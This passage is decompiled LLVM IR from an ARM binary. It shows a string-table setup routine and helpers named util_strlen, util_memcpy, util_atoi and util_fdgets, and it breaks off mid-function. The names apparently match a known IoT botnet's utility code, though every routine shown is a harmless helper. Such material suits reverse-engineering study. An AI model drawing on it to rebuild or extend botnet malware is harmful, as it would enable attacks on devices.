  %v4_10090 = call i32 @util_memcpy(i32 %v1_10080, i32 ptrtoint ([9 x i8]* @global_var_19134.287 to i32), i32 %v0_10088)
  %v0_10094 = load i32, i32* @sb, align 4
  %v0_10098 = load i32, i32* @r5, align 4
  store i32 %v0_10098, i32* @global_var_244c4.288, align 4
  %v0_1009c = load i32, i32* @r6, align 4
  %v1_1009c = trunc i32 %v0_1009c to i16
  store i16 %v1_1009c, i16* bitcast (i32* @global_var_244c8.289 to i16*), align 4
  %v1_100a0 = call i32 @malloc(i32 %v0_10094)
  %v0_100a8 = load i32, i32* @sb, align 4
  store i32 %v1_100a0, i32* @r5, align 4
  %v4_100b0 = call i32 @util_memcpy(i32 %v1_100a0, i32 ptrtoint ([6 x i8]* @global_var_19140.291 to i32), i32 %v0_100a8)
  %v0_100b4 = load i32, i32* @sl, align 4
  %v0_100b8 = load i32, i32* @r5, align 4
  store i32 %v0_100b8, i32* @global_var_244cc.292, align 4
  %v0_100bc = load i32, i32* @sb, align 4
  %v1_100bc = trunc i32 %v0_100bc to i16
  store i16 %v1_100bc, i16* bitcast (i32* @global_var_244d0.293 to i16*), align 4
  %v1_100c0 = call i32 @malloc(i32 %v0_100b4)
  %v0_100c8 = load i32, i32* @sl, align 4
  store i32 %v1_100c0, i32* @r5, align 4
  %v4_100d0 = call i32 @util_memcpy(i32 %v1_100c0, i32 ptrtoint ([7 x i8]* @global_var_19148.295 to i32), i32 %v0_100c8)
  %v0_100d8 = load i32, i32* @r5, align 4
  store i32 %v0_100d8, i32* @global_var_244d4.296, align 4
  %v0_100dc = load i32, i32* @sl, align 4
  %v1_100dc = trunc i32 %v0_100dc to i16
  store i16 %v1_100dc, i16* bitcast (i32* @global_var_244d8.297 to i16*), align 4
  %v1_100e0 = call i32 @malloc(i32 23)
  %v4_100f0 = call i32 @util_memcpy(i32 %v1_100e0, i32 ptrtoint ([24 x i8]* @global_var_19150.299 to i32), i32 23)
  store i32 %v1_100e0, i32* @global_var_244dc.300, align 4
  store i16 23, i16* bitcast (i32* @global_var_244e0.301 to i16*), align 4
  %v2_10100 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10100, i32* @r4, align 4
  store i32 %v6_fe20, i32* @r5, align 4
  store i32 %v9_fe20, i32* @r6, align 4
  store i32 %v12_fe20, i32* @r7, align 4
  store i32 %v15_fe20, i32* @r8, align 4
  store i32 %v18_fe20, i32* @sb, align 4
  store i32 %v21_fe20, i32* @sl, align 4
  ret i32 %v4_100f0

; uselistorder directives
  uselistorder i32 %v1_100c0, { 1, 0 }
  uselistorder i32 %v1_100a0, { 1, 0 }
  uselistorder i32 %v1_10080, { 1, 0 }
  uselistorder i32 %v1_1003c, { 1, 0 }
  uselistorder i32 %v1_ffb0, { 1, 0 }
  uselistorder i32 %v1_ff6c, { 1, 0 }
  uselistorder i32 %v1_ff48, { 1, 0 }
  uselistorder i32 %v1_fe50, { 1, 0 }
  uselistorder i32 %v1_fe28, { 1, 0 }
  uselistorder i32 23, { 1, 0, 2, 3, 4 }
  uselistorder i32 29, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_243fc.211 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10164 = load i8, i8* %arg1, align 1
  %v2_10168 = icmp eq i8 %v3_10164, 0
  %v0_1016c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10168, i32 %v0_1016c)
  br label %dec_label_pc_10174

dec_label_pc_10174:                               ; preds = %dec_label_pc_10174, %entry
  %v0_10174 = phi i32 [ %v1_10174, %dec_label_pc_10174 ], [ 0, %entry ]
  %v1_10174 = add i32 %v0_10174, 1
  %v2_10178 = add i32 %v1_10174, %tmp
  %v3_10178 = inttoptr i32 %v2_10178 to i8*
  %v4_10178 = load i8, i8* %v3_10178, align 1
  %v6_10178 = zext i8 %v4_10178 to i32
  store i32 %v6_10178, i32* @r3, align 4
  %v2_1017c = icmp eq i8 %v4_10178, 0
  br i1 %v2_1017c, label %dec_label_pc_10184, label %dec_label_pc_10174

dec_label_pc_10184:                               ; preds = %dec_label_pc_10174
  ret i32 %v1_10174
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10188 = load i8, i8* %arg1, align 1
  %v3_10188 = zext i8 %v2_10188 to i32
  store i32 %v3_10188, i32* @r2, align 4
  %v2_1018c = icmp eq i8 %v2_10188, 0
  br i1 %v2_1018c, label %bb, label %dec_label_pc_10198

bb:                                               ; preds = %entry
  store i32 %v3_10188, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_101ac

dec_label_pc_10198:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1019c

dec_label_pc_1019c:                               ; preds = %dec_label_pc_1019c, %dec_label_pc_10198
  %v0_1019c = phi i32 [ %v1_1019c, %dec_label_pc_1019c ], [ 0, %dec_label_pc_10198 ]
  %v1_1019c = add i32 %v0_1019c, 1
  store i32 %v1_1019c, i32* %ip.global-to-local, align 4
  %v2_101a0 = add i32 %v1_1019c, %tmp
  %v3_101a0 = inttoptr i32 %v2_101a0 to i8*
  %v4_101a0 = load i8, i8* %v3_101a0, align 1
  %v2_101a4 = icmp eq i8 %v4_101a0, 0
  br i1 %v2_101a4, label %dec_label_pc_101ac, label %dec_label_pc_1019c

dec_label_pc_101ac:                               ; preds = %dec_label_pc_1019c, %bb
  %v0_101ac = phi i32 [ %v3_10188, %bb ], [ %v1_1019c, %dec_label_pc_1019c ]
  br label %dec_label_pc_101b8

dec_label_pc_101b4:                               ; preds = %dec_label_pc_101b8
  %v0_101b4 = load i32, i32* @r1, align 4
  %v1_101b4 = add i32 %v0_101b4, 1
  %v2_101b4 = inttoptr i32 %v1_101b4 to i8*
  %v3_101b4 = load i8, i8* %v2_101b4, align 1
  %v4_101b4 = zext i8 %v3_101b4 to i32
  store i32 %v4_101b4, i32* @r2, align 4
  store i32 %v1_101b4, i32* @r1, align 4
  %v0_101b8.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_101b8

dec_label_pc_101b8:                               ; preds = %dec_label_pc_101ac, %dec_label_pc_101b4
  %v0_101c0.off0 = phi i8 [ %v2_10188, %dec_label_pc_101ac ], [ %v3_101b4, %dec_label_pc_101b4 ]
  %v0_101b8 = phi i32 [ %v0_101ac, %dec_label_pc_101ac ], [ %v0_101b8.pr, %dec_label_pc_101b4 ]
  %v1_101b8 = add i32 %v0_101b8, -1
  store i32 %v1_101b8, i32* @r3, align 4
  %v3_101bc = icmp eq i32 %v0_101b8, 0
  %v2_101c0 = load i32, i32* @r0, align 4
  %v3_101c0 = inttoptr i32 %v2_101c0 to i8*
  store i8 %v0_101c0.off0, i8* %v3_101c0, align 1
  %v4_101c0 = load i32, i32* @r0, align 4
  %v5_101c0 = add i32 %v4_101c0, 1
  store i32 %v5_101c0, i32* @r0, align 4
  br i1 %v3_101bc, label %dec_label_pc_101c8, label %dec_label_pc_101b4

dec_label_pc_101c8:                               ; preds = %dec_label_pc_101b8
  %v0_101c8 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_101c8

; uselistorder directives
  uselistorder i32 %v0_101b8, { 1, 0 }
  uselistorder i32 %v1_1019c, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_101b8, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_101d0 = icmp eq i32 %arg3, 0
  %v0_101d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_101d0, i32 %v0_101d4)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_101dc

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101dc, %entry
  %v0_101dc = phi i32 [ %v1_101e4, %dec_label_pc_101dc ], [ 0, %entry ]
  %v2_101dc = add i32 %v0_101dc, %arg2
  %v3_101dc = inttoptr i32 %v2_101dc to i8*
  %v4_101dc = load i8, i8* %v3_101dc, align 1
  %v4_101e0 = add i32 %v0_101dc, %arg1
  %v5_101e0 = inttoptr i32 %v4_101e0 to i8*
  store i8 %v4_101dc, i8* %v5_101e0, align 1
  %v0_101e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_101e4 = add i32 %v0_101e4, 1
  store i32 %v1_101e4, i32* %ip.global-to-local, align 4
  %v9_101e8 = icmp eq i32 %v1_101e4, %arg3
  br i1 %v9_101e8, label %dec_label_pc_101f0, label %dec_label_pc_101dc

dec_label_pc_101f0:                               ; preds = %dec_label_pc_101dc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_101e4, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_101f4 = load i32, i32* @r1, align 4
  %v2_101f4 = icmp eq i32 %v0_101f4, 0
  %v0_101f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_101f4, i32 %v0_101f8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10200

dec_label_pc_10200:                               ; preds = %dec_label_pc_10200, %entry
  %v2_10204 = phi i32 [ %v1_10208, %dec_label_pc_10200 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10204 = load i32, i32* @r0, align 4
  %v4_10204 = add i32 %v3_10204, %v2_10204
  %v5_10204 = inttoptr i32 %v4_10204 to i8*
  store i8 0, i8* %v5_10204, align 1
  %v0_10208 = load i32, i32* %r2.global-to-local, align 4
  %v1_10208 = add i32 %v0_10208, 1
  store i32 %v1_10208, i32* %r2.global-to-local, align 4
  %v1_1020c = load i32, i32* @r1, align 4
  %v9_1020c = icmp eq i32 %v1_10208, %v1_1020c
  br i1 %v9_1020c, label %dec_label_pc_10214, label %dec_label_pc_10200

dec_label_pc_10214:                               ; preds = %dec_label_pc_10200
  %v1_10214 = load i32, i32* @r0, align 4
  ret i32 %v1_10214

; uselistorder directives
  uselistorder i32 %v1_10208, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_1022c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_1022c, label %dec_label_pc_10234, label %dec_label_pc_1023c

dec_label_pc_10234:                               ; preds = %dec_label_pc_10250, %dec_label_pc_1023c, %entry, %dec_label_pc_1027c
  %storemerge = phi i32 [ %v1_1027c, %dec_label_pc_1027c ], [ -1, %entry ], [ -1, %dec_label_pc_1023c ], [ -1, %dec_label_pc_10250 ]
  ret i32 %storemerge

dec_label_pc_1023c:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10234, label %dec_label_pc_10244

dec_label_pc_10244:                               ; preds = %dec_label_pc_1023c
  br label %dec_label_pc_1025c

dec_label_pc_10250:                               ; preds = %bb, %dec_label_pc_10270
  %v1_1025c3 = phi i32 [ %v1_10270, %dec_label_pc_10270 ], [ 0, %bb ]
  %v1_10250 = add i32 %v0_1027c, 1
  %v9_10254 = icmp eq i32 %v1_10250, %arg2
  br i1 %v9_10254, label %dec_label_pc_10234, label %dec_label_pc_1025c

dec_label_pc_1025c:                               ; preds = %dec_label_pc_10250, %dec_label_pc_10244
  %v0_1027c = phi i32 [ %v1_10250, %dec_label_pc_10250 ], [ 0, %dec_label_pc_10244 ]
  %v1_1025c = phi i32 [ %v1_1025c3, %dec_label_pc_10250 ], [ 0, %dec_label_pc_10244 ]
  %v2_1025c = add i32 %v1_1025c, %arg3
  %v3_1025c = inttoptr i32 %v2_1025c to i8*
  %v4_1025c = load i8, i8* %v3_1025c, align 1
  %v2_10260 = add i32 %v0_1027c, %arg1
  %v3_10260 = inttoptr i32 %v2_10260 to i8*
  %v4_10260 = load i8, i8* %v3_10260, align 1
  %v9_10264 = icmp eq i8 %v4_10260, %v4_1025c
  br i1 %v9_10264, label %dec_label_pc_10270, label %bb

bb:                                               ; preds = %dec_label_pc_1025c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10250

dec_label_pc_10270:                               ; preds = %dec_label_pc_1025c
  %v1_10270 = add i32 %v1_1025c, 1
  store i32 %v1_10270, i32* @ip, align 4
  %v9_10274 = icmp eq i32 %v1_10270, %arg4
  br i1 %v9_10274, label %dec_label_pc_1027c, label %dec_label_pc_10250

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10270
  %v1_1027c = add i32 %v0_1027c, 1
  br label %dec_label_pc_10234

; uselistorder directives
  uselistorder i32 %v1_10270, { 1, 2, 0 }
  uselistorder i32 %v1_1025c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10250, { 1, 0 }
  uselistorder label %dec_label_pc_10234, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10294

dec_label_pc_10294:                               ; preds = %.thread, %dec_label_pc_102a8, %bb, %entry
  %v0_10294 = phi i32 [ %tmp, %entry ], [ %v5_10294, %bb ], [ %v5_10294, %dec_label_pc_102a8 ], [ %v5_10294, %.thread ]
  %v1_10294 = inttoptr i32 %v0_10294 to i8*
  %v2_10294 = load i8, i8* %v1_10294, align 1
  %v5_10294 = add i32 %v0_10294, 1
  %v7_10298 = icmp eq i8 %v2_10294, 9
  br i1 %v7_10298, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10294
  br label %dec_label_pc_10294

bb:                                               ; preds = %dec_label_pc_10294
  %v8_1029c = icmp eq i8 %v2_10294, 32
  br i1 %v8_1029c, label %dec_label_pc_10294, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %bb
  %v7_102a8 = icmp eq i8 %v2_10294, 10
  br i1 %v7_102a8, label %dec_label_pc_10294, label %dec_label_pc_102b0

dec_label_pc_102b0:                               ; preds = %dec_label_pc_102a8
  %v7_102b0 = icmp eq i8 %v2_10294, 45
  br i1 %v7_102b0, label %dec_label_pc_103a0, label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_102b0
  %v7_102b8 = icmp eq i8 %v2_10294, 43
  br i1 %v7_102b8, label %bb54, label %dec_label_pc_102c8

bb54:                                             ; preds = %dec_label_pc_102b8
  %v2_102bc = inttoptr i32 %v5_10294 to i8*
  %v3_102bc = load i8, i8* %v2_102bc, align 1
  %v6_102bc = add i32 %v0_10294, 2
  br label %dec_label_pc_102c8

dec_label_pc_102c8:                               ; preds = %bb54, %dec_label_pc_102b8, %dec_label_pc_103a0
  %v1_1037039 = phi i32 [ %v5_103a0, %dec_label_pc_103a0 ], [ %v5_10294, %dec_label_pc_102b8 ], [ %v6_102bc, %bb54 ]
  %v0_102f010.in = phi i8 [ %v2_103a0, %dec_label_pc_103a0 ], [ %v2_10294, %dec_label_pc_102b8 ], [ %v3_102bc, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_103a0 ], [ 2147483647, %dec_label_pc_102b8 ], [ 2147483647, %bb54 ]
  %v0_103b0 = phi i32 [ 1, %dec_label_pc_103a0 ], [ 0, %dec_label_pc_102b8 ], [ 0, %bb54 ]
  %v2_102d0 = udiv i32 %storemerge1, %arg2
  %v3_102d0 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_102f0.outer

dec_label_pc_102f0.outer:                         ; preds = %.thread5, %dec_label_pc_102c8
  %v1_10370.ph = phi i32 [ %v6_10370, %.thread5 ], [ %v1_1037039, %dec_label_pc_102c8 ]
  %v2_1036c.ph = phi i32 [ %v5_1036c, %.thread5 ], [ 0, %dec_label_pc_102c8 ]
  %v1_10330.ph.in = phi i8 [ %v3_10370, %.thread5 ], [ %v0_102f010.in, %dec_label_pc_102c8 ]
  %v1_10348.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_102c8 ]
  %v3_1033c = icmp uge i32 %v2_1036c.ph, %v2_102d0
  %v9_1033c = icmp eq i32 %v2_1036c.ph, %v2_102d0
  %v2_10340 = xor i1 %v3_1033c, true
  %v3_10340 = or i1 %v9_1033c, %v2_10340
  %v2_10344 = xor i1 %v9_1033c, true
  %v3_10344 = and i1 %v3_1033c, %v2_10344
  %v2_10364 = icmp eq i1 %v9_1033c, false
  br label %dec_label_pc_102f0

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102f0.outer, %dec_label_pc_10378
  %v1_10370 = phi i32 [ %v5_10378, %dec_label_pc_10378 ], [ %v1_10370.ph, %dec_label_pc_102f0.outer ]
  %v1_10348 = phi i32 [ -1, %dec_label_pc_10378 ], [ %v1_10348.ph, %dec_label_pc_102f0.outer ]
  %v1_10330.in = phi i8 [ %v2_10378, %dec_label_pc_10378 ], [ %v1_10330.ph.in, %dec_label_pc_102f0.outer ]
  %v1_10330 = zext i8 %v1_10330.in to i32
  %v1_102f0 = urem i32 %v1_10330, 256
  %v1_102f4 = add nsw i32 %v1_102f0, -48
  %v1_102fc = add nsw i32 %v1_102f0, -97
  %v1_10300 = add nsw i32 %v1_10330, -48
  %v1_10304 = add nsw i32 %v1_102f0, -65
  %tmp87 = icmp ult i32 %v1_102f4, 10
  br i1 %tmp87, label %dec_label_pc_10334, label %dec_label_pc_1030c

dec_label_pc_1030c:                               ; preds = %dec_label_pc_102f0
  %v2_1030c = icmp ugt i32 %v1_10304, 24
  %v7_1030c = icmp eq i32 %v1_10304, 25
  %v2_10310 = xor i1 %v7_1030c, true
  %v3_10310 = and i1 %v2_1030c, %v2_10310
  br i1 %v3_10310, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_1030c
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_1030c, %bb55
  %v0_1032415 = phi i32 [ %v1_10300, %dec_label_pc_1030c ], [ 0, %bb55 ]
  %v2_10314 = xor i1 %v2_1030c, true
  %v3_10314 = or i1 %v7_1030c, %v2_10314
  br i1 %v3_10314, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10324 = phi i32 [ %v0_1032415, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10310, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_1031c = icmp ugt i32 %v1_102fc, 24
  %v11_1031c = icmp eq i32 %v1_102fc, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10320 = phi i1 [ %v7_1030c, %bb58 ], [ %v11_1031c, %bb59 ]
  %v0_10320 = phi i1 [ %v2_1030c, %bb58 ], [ %v6_1031c, %bb59 ]
  %v2_10320 = xor i1 %v1_10320, true
  %v3_10320 = and i1 %v0_10320, %v2_10320
  br i1 %v3_10320, label %dec_label_pc_10384, label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %bb60
  %v2_10324 = icmp eq i32 %v0_10324, 0
  %. = select i1 %v2_10324, i32 87, i32 55
  %v2_10330 = sub nsw i32 %v1_10330, %.
  br label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_102f0, %dec_label_pc_10324
  %v0_1034833 = phi i32 [ %v1_10304, %dec_label_pc_102f0 ], [ %., %dec_label_pc_10324 ]
  %v3_1036c = phi i32 [ %v1_10300, %dec_label_pc_102f0 ], [ %v2_10330, %dec_label_pc_10324 ]
  %v2_10334 = sub i32 %v3_1036c, %arg2
  %v4_10334 = xor i32 %v3_1036c, %arg2
  %v5_10334 = xor i32 %v2_10334, %v3_1036c
  %v6_10334 = and i32 %v5_10334, %v4_10334
  %v7_10334 = icmp slt i32 %v6_10334, 0
  %v8_10334 = icmp slt i32 %v2_10334, 0
  %v2_10338 = xor i1 %v8_10334, %v7_10334
  br i1 %v2_10338, label %dec_label_pc_1033c, label %dec_label_pc_10384

dec_label_pc_1033c:                               ; preds = %dec_label_pc_10334
  br i1 %v3_10340, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_1033c
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1033c, %bb63
  %v0_1034832 = phi i32 [ %v0_1034833, %dec_label_pc_1033c ], [ 0, %bb63 ]
  br i1 %v3_10344, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10348 = phi i32 [ %v0_1034832, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10348, 0
  %v4_10348 = zext i1 %tmp88 to i32
  %v5_10348 = or i32 %v0_10348, %v4_10348
  %v7_10348 = icmp eq i32 %v5_10348, 0
  br i1 %v7_10348, label %dec_label_pc_10350, label %dec_label_pc_10378

dec_label_pc_10350:                               ; preds = %bb66
  %v2_1035c = sub i32 %v3_1036c, %v3_102d0
  %v4_1035c = xor i32 %v3_1036c, %v3_102d0
  %v5_1035c = xor i32 %v2_1035c, %v3_1036c
  %v6_1035c = and i32 %v5_1035c, %v4_1035c
  %v7_1035c = icmp slt i32 %v6_1035c, 0
  %v8_1035c = icmp slt i32 %v2_1035c, 0
  %v9_1035c = icmp eq i32 %v3_1036c, %v3_102d0
  %v3_10360 = xor i1 %v8_1035c, %v7_1035c
  %v4_10360 = or i1 %v9_1035c, %v3_10360
  br i1 %v4_10360, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10350
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10350
  br i1 %v2_10364, label %.thread5, label %dec_label_pc_10378

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1036c = mul i32 %v2_1036c.ph, %arg2
  %v5_1036c = add i32 %v3_1036c, %v4_1036c
  %v2_10370 = inttoptr i32 %v1_10370 to i8*
  %v3_10370 = load i8, i8* %v2_10370, align 1
  %v6_10370 = add i32 %v1_10370, 1
  br label %dec_label_pc_102f0.outer

dec_label_pc_10378:                               ; preds = %thread-pre-split, %bb66
  %v1_10378 = inttoptr i32 %v1_10370 to i8*
  %v2_10378 = load i8, i8* %v1_10378, align 1
  %v5_10378 = add i32 %v1_10370, 1
  br label %dec_label_pc_102f0

dec_label_pc_10384:                               ; preds = %dec_label_pc_10334, %bb60
  %v1_10384 = icmp slt i32 %v1_10348, 0
  %v2_103b0 = icmp eq i32 %v0_103b0, 0
  br i1 %v1_10384, label %dec_label_pc_103b0, label %dec_label_pc_1038c

dec_label_pc_1038c:                               ; preds = %dec_label_pc_10384
  br i1 %v2_103b0, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_1038c
  %v2_10390 = sub i32 0, %v2_1036c.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_1038c, %bb69
  %v1_1039c = phi i32 [ -2147483648, %bb71 ], [ %v2_1036c.ph, %dec_label_pc_1038c ], [ %v2_10390, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_1039c

dec_label_pc_103a0:                               ; preds = %dec_label_pc_102b0
  %v1_103a0 = inttoptr i32 %v5_10294 to i8*
  %v2_103a0 = load i8, i8* %v1_103a0, align 1
  %v5_103a0 = add i32 %v0_10294, 2
  br label %dec_label_pc_102c8

dec_label_pc_103b0:                               ; preds = %dec_label_pc_10384
  br i1 %v2_103b0, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_103b0
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_103b0
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_103b0, { 1, 0 }
  uselistorder i32 %v2_1035c, { 1, 0 }
  uselistorder i32 %v2_10334, { 1, 0 }
  uselistorder i32 %v3_1036c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1030c, { 1, 2, 0 }
  uselistorder i1 %v2_1030c, { 1, 0, 2 }
  uselistorder i32 %v1_102f0, { 1, 2, 0 }
  uselistorder i32 %v1_10330, { 1, 0, 2 }
  uselistorder i32 %v1_10348, { 1, 0 }
  uselistorder i32 %v1_10370, { 2, 3, 1, 0 }
  uselistorder i1 %v9_1033c, { 1, 0, 2 }
  uselistorder i1 %v3_1033c, { 1, 0 }
  uselistorder i32 %v2_1036c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_102d0, { 1, 0, 2 }
  uselistorder i32 %v2_102d0, { 1, 0 }
  uselistorder i32 %v5_10294, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10294, { 0, 1, 3, 2 }
  uselistorder i32 25, { 20, 21, 5, 12, 2, 11, 3, 13, 4, 14, 10, 6, 15, 0, 16, 7, 8, 17, 9, 18, 1, 19 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10334, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_102f0, { 1, 0 }
  uselistorder label %dec_label_pc_102c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10294, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_103c0 = load i32, i32* @r4, align 4
  store i32 %v3_103c0, i32* %stack_var_-24, align 4
  %v6_103c0 = load i32, i32* @r5, align 4
  %v9_103c0 = load i32, i32* @r6, align 4
  %v12_103c0 = load i32, i32* @r7, align 4
  %v15_103c0 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_103d8

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103fc.dec_label_pc_103d8_crit_edge, %entry
  %v0_103dc = phi i32 [ %v0_103dc.pre, %dec_label_pc_103fc.dec_label_pc_103d8_crit_edge ], [ %arg3, %entry ]
  %v0_103d8 = phi i32 [ %v5_103fc, %dec_label_pc_103fc.dec_label_pc_103d8_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_103d8, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_103e4 = call i32 @__libc_read(i32 %v0_103dc)
  %v7_103e8 = icmp eq i32 %v1_103e4, 1
  %v0_103f0 = load i32, i32* @r5, align 4
  br i1 %v7_103e8, label %dec_label_pc_103f0, label %dec_label_pc_10408

dec_label_pc_103f0:                               ; preds = %dec_label_pc_103d8
  %v1_103f0 = add i32 %v0_103f0, 1
  store i32 %v1_103f0, i32* @r5, align 4
  %v1_103f4 = load i32, i32* @r8, align 4
  %v6_103f8 = icmp slt i32 %v1_103f0, %v1_103f4
  br i1 %v6_103f8, label %dec_label_pc_103fc, label %.loopexit

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103f0
  %v0_103fc = load i32, i32* @r4, align 4
  %v1_103fc = inttoptr i32 %v0_103fc to i8*
  %v2_103fc = load i8, i8* %v1_103fc, align 1
  %v3_103fc = zext i8 %v2_103fc to i32
  store i32 %v3_103fc, i32* @r3, align 4
  %v5_103fc = add i32 %v0_103fc, 1
  store i32 %v5_103fc, i32* @r4, align 4
  %v7_10400 = icmp eq i8 %v2_103fc, 10
  br i1 %v7_10400, label %dec_label_pc_10408, label %dec_label_pc_103fc.dec_label_pc_103d8_crit_edge

dec_label_pc_103fc.dec_label_pc_103d8_crit_edge:  ; preds = %dec_label_pc_103fc
  %v0_103dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_103d8

dec_label_pc_10408:                               ; preds = %dec_label_pc_103d8, %dec_label_pc_103fc
  %v0_10408 = phi i32 [ %v1_103f0, %dec_label_pc_103fc ], [ %v0_103f0, %dec_label_pc_103d8 ]
  %v2_10408 = icmp eq i32 %v0_10408, 0
  br i1 %v2_10408, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10408
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_103f0, %dec_label_pc_10408, %bb
  %v0_10410 = load i32, i32* @r7, align 4
  %v2_10414 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10414, i32* @r4, align 4
  store i32 %v6_103c0, i32* @r5, align 4
  store i32 %v9_103c0, i32* @r6, align 4
  store i32 %v12_103c0, i32* @r7, align 4
  store i32 %v15_103c0, i32* @r8, align 4
  ret i32 %v0_10410

; uselistorder directives
  uselistorder i32 %v5_103fc, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10408, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
